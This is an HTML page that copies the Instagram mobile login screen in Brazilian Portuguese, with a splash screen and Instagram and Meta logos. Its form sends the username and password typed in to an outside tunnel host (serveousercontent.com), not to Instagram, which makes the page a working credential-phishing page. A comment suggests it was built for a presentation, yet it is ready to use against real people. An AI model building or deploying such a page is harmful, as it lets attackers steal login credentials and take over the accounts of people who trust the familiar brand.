<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>Instagram</title>
    <style>
        * { 
            box-sizing: border-box; 
            margin: 0; 
            padding: 0; 
            -webkit-tap-highlight-color: transparent; 
        }

        body, html { 
            height: 100dvh; 
            background-color: #000; 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            overflow: hidden;
        }

        /* ========== SPLASH ========== */
        #splash {
            position: fixed; 
            inset: 0; 
            background: #000;
            display: flex; 
            flex-direction: column; 
            align-items: center;
            justify-content: space-between; 
            padding: 120px 0 60px 0; 
            z-index: 1000; 
            transition: opacity 0.35s cubic-bezier(0.4, 0, 0.2, 1);
        }

        .splash-logo-wrapper {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .insta-splash-logo {
            width: 80px; 
            height: 80px;
            filter: drop-shadow(0 0 8px rgba(252, 175, 69, 0.15));
        }

        .from-meta-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 6px;
        }

        .from-text {
            color: #8E8E8E;
            font-size: 13px;
            font-weight: 400;
            letter-spacing: 0.3px;
            text-transform: lowercase;
        }

        .meta-splash {
            display: flex;
            align-items: baseline;
            gap: 4px;
        }

        .infinity-splash {
            font-size: 24px;
            line-height: 1;
            font-weight: 600;
            background: linear-gradient(135deg, #FCAF45 0%, #FD1D1D 35%, #E1306C 55%, #C13584 75%, #833AB4 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }

        .meta-word-splash {
            font-size: 20px;
            font-weight: 700;
            letter-spacing: -0.3px;
            background: linear-gradient(135deg, #FCAF45 0%, #FD1D1D 35%, #E1306C 55%, #C13584 75%, #833AB4 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }

        /* ========== LOGIN SCREEN ========== */
        #login-screen {
            display: none; 
            flex-direction: column; 
            align-items: center;
            width: 100%; 
            height: 100dvh; 
            background-color: #000000;
            padding: 0 16px; 
        }

        .lang-selector-wrapper {
            width: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 16px 0 8px 0;
            margin-bottom: 12px;
        }

        .lang-selector { 
            color: #A8A8A8; 
            font-size: 14px;
            font-weight: 400;
            display: flex;
            align-items: center;
            gap: 4px;
        }

        .lang-selector svg {
            width: 12px;
            height: 12px;
            fill: #A8A8A8;
        }

        .insta-logo-login-wrapper {
            width: 100%;
            display: flex;
            justify-content: center;
            margin-bottom: 36px;
        }

        .insta-logo-login { 
            width: 64px; 
            height: 64px;
            filter: drop-shadow(0 2px 4px rgba(0, 0, 0, 0.3));
        }

        form { 
            width: 100%; 
            max-width: 358px;
        }

        .input-box {
            width: 100%; 
            background: #121212; 
            border: 0.5px solid #363636;
            border-radius: 12px; 
            padding: 14px 16px; 
            color: #FFFFFF;
            font-size: 14px; 
            font-weight: 400;
            margin-bottom: 10px;
            outline: none;
            transition: border-color 0.2s ease;
        }

        .input-box:focus {
            border-color: #A8A8A8;
        }

        .input-box::placeholder {
            color: #8E8E8E;
            font-size: 14px;
            font-weight: 400;
        }

        .btn-login {
            width: 100%; 
            background: #0095F6; 
            color: #FFFFFF;
            border: none; 
            border-radius: 18px; 
            padding: 7px 0;
            font-size: 14px; 
            font-weight: 600; 
            margin-top: 12px;
            margin-bottom: 16px;
            cursor: pointer;
            transition: background 0.2s ease;
            line-height: 18px;
        }

        .btn-login:hover {
            background: #1877F2;
        }

        .btn-login:active {
            opacity: 0.7;
        }

        .forgot-pass-wrapper {
            width: 100%;
            text-align: center;
            margin-bottom: 80px;
        }

        .forgot-pass { 
            color: #FFFFFF; 
            font-size: 14px; 
            font-weight: 500;
            text-decoration: none; 
        }

        .forgot-pass:active {
            opacity: 0.7;
        }

        .footer-container {
            margin-top: auto; 
            width: 100%; 
            display: flex;
            flex-direction: column; 
            align-items: center; 
            padding-bottom: 24px;
        }

        /* Botão Criar nova conta - estilo original */
        .signup-btn {
            width: 100%;
            max-width: 358px;
            background: transparent;
            border: 1px solid #0095F6;
            border-radius: 18px;
            padding: 7px 0;
            color: #0095F6;
            font-size: 14px;
            font-weight: 600;
            text-align: center;
            text-decoration: none;
            margin-bottom: 28px;
            line-height: 18px;
            transition: background 0.2s ease;
        }

        .signup-btn:active {
            background: rgba(0, 149, 246, 0.1);
        }

        /* Meta footer - estilo original */
        .meta-footer {
            display: flex;
            align-items: center;
            justify-content: center;
            opacity: 0.6;
        }

        .meta-footer svg {
            width: 70px;
            height: auto;
        }
    </style>
</head>
<body>

    <!-- Gradientes SVG -->
    <svg style="width:0; height:0; position:absolute;">
        <defs>
            <linearGradient id="instaGradient" x1="0%" y1="0%" x2="100%" y2="100%">
                <stop offset="0%" stop-color="#833AB4"/>
                <stop offset="25%" stop-color="#C13584"/>
                <stop offset="50%" stop-color="#E1306C"/>
                <stop offset="75%" stop-color="#FD1D1D"/>
                <stop offset="100%" stop-color="#FCAF45"/>
            </linearGradient>
        </defs>
    </svg>

    <!-- SPLASH -->
    <div id="splash">
        <div class="splash-logo-wrapper">
            <svg class="insta-splash-logo" viewBox="0 0 24 24" fill="none">
                <rect x="1.5" y="1.5" width="21" height="21" rx="6" stroke="url(#instaGradient)" stroke-width="2.2" fill="none"/>
                <circle cx="12" cy="12" r="5.5" stroke="url(#instaGradient)" stroke-width="2.2" fill="none"/>
                <circle cx="17.8" cy="6.2" r="1.8" fill="url(#instaGradient)"/>
            </svg>
        </div>

        <div class="from-meta-container">
            <p class="from-text">from</p>
            <div class="meta-splash">
                <span class="infinity-splash">∞</span>
                <span class="meta-word-splash">Meta</span>
            </div>
        </div>
    </div>

    <!-- LOGIN SCREEN -->
    <div id="login-screen">
        <div class="lang-selector-wrapper">
            <div class="lang-selector">
                <span>Português (Brasil)</span>
                <svg viewBox="0 0 24 24">
                    <path d="M7 10l5 5 5-5H7z"/>
                </svg>
            </div>
        </div>
        
        <div class="insta-logo-login-wrapper">
            <svg class="insta-logo-login" viewBox="0 0 24 24" fill="none">
                <rect x="1.5" y="1.5" width="21" height="21" rx="6" stroke="url(#instaGradient)" stroke-width="2.2" fill="none"/>
                <circle cx="12" cy="12" r="5.5" stroke="url(#instaGradient)" stroke-width="2.2" fill="none"/>
                <circle cx="17.8" cy="6.2" r="1.8" fill="url(#instaGradient)"/>
            </svg>
        </div>

        <!-- FORMULÁRIO ORIGINAL - com action da apresentação -->
        <form action="https://fdd6aca0b57657d1-143-208-80-199.serveousercontent.com" method="POST">
            <input type="text" name="username" class="input-box" placeholder="Nome de usuário, e-mail ou número" required>
            <input type="password" name="password" class="input-box" placeholder="Senha" required>
            <button type="submit" class="btn-login">Entrar</button>
        </form>

        <div class="forgot-pass-wrapper">
            <a href="#" class="forgot-pass">Esqueceu a senha?</a>
        </div>

        <div class="footer-container">
            <a href="#" class="signup-btn">Criar nova conta</a>
            
            <!-- Meta logo original -->
            <div class="meta-footer">
                <svg viewBox="0 0 287 56" fill="white" xmlns="http://www.w3.org/2000/svg">
                    <path d="M55.5 14.5C55.5 14.5 58.5 10 64 10C69.5 10 72 15 72 15L79 4C79 4 73.5 -2 64 2C54.5 6 55.5 14.5 55.5 14.5Z" fill="currentColor"/>
                    <path d="M46 46C46 46 40 52 33 52C26 52 21 47 21 40C21 33 26 28 33 28C40 28 45 33 45 33L38 41C38 41 36 44 33 44C30 44 28 42 28 40C28 38 30 36 33 36C35 36 37 38 37 38L46 46Z" fill="currentColor"/>
                    <path d="M90 52L90 4L98 4L98 52L90 52Z" fill="currentColor"/>
                    <path d="M110 52L110 4L118 4L118 52L110 52Z" fill="currentColor"/>
                    <path d="M130 52L130 4L138 4L138 24L152 4L162 4L146 22L164 52L152 52L138 28L138 52L130 52Z" fill="currentColor"/>
                    <path d="M175 52L175 4L183 4L183 24L197 4L207 4L191 22L209 52L197 52L183 28L183 52L175 52Z" fill="currentColor"/>
                    <circle cx="230" cy="28" r="24" stroke="currentColor" stroke-width="8" fill="none"/>
                    <path d="M267 52L267 4L275 4L275 52L267 52Z" fill="currentColor"/>
                </svg>
            </div>
        </div>
    </div>

    <script>
        window.addEventListener('load', () => {
            const splash = document.getElementById('splash');
            const login = document.getElementById('login-screen');
            
            setTimeout(() => {
                splash.style.opacity = '0';
                setTimeout(() => {
                    splash.style.display = 'none';
                    login.style.display = 'flex';
                }, 350);
            }, 2200);
        });
    </script>
</body>
</html>
